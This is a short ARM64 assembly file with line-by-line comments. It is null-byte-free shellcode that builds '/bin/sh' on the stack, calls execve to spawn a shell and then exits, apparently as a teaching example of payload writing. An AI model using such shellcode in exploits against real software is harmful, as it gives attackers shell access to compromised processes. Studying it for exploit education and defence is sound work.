// shell in asm
.global _start
_start:
    mov  x3,  #0x622F             // Least significant 16-bits are '/b'.
    movk x3,  #0x6E69, lsl #16    // Next 16-bits are 'in'. movk is mov with a 16-bit immediate but keeping other values of the dest register unchanged
    movk x3,  #0x732F, lsl #32    // Next 16-bits are '/s'
    movk x3,  #0x0068, lsl #48    // Last 16-bits are 'h\0', as execve expects a null terminated string
    str  x3,  [sp, #-8]!          // Push our constructed string onto the stack, before that decrement the stack pointer to allocate space 
    add  x0,  sp, xzr             // Load the address of the stack pointer (our constructed string) in x0 (first arg of execve)
    mov  x1,  xzr                 // argp is null
    mov  x2,  xzr                 // envp is null
    mov  x16, #0x3b               // Syscall number 59 for execve
    svc  #0xffff                  // Large number to avoid null-bytes

    mov x0,  xzr
    orr x16, xzr, #1             // OR xzr with 1 and put the result to x16. Null-byte free version of mov x16, #1
    svc #0xffff
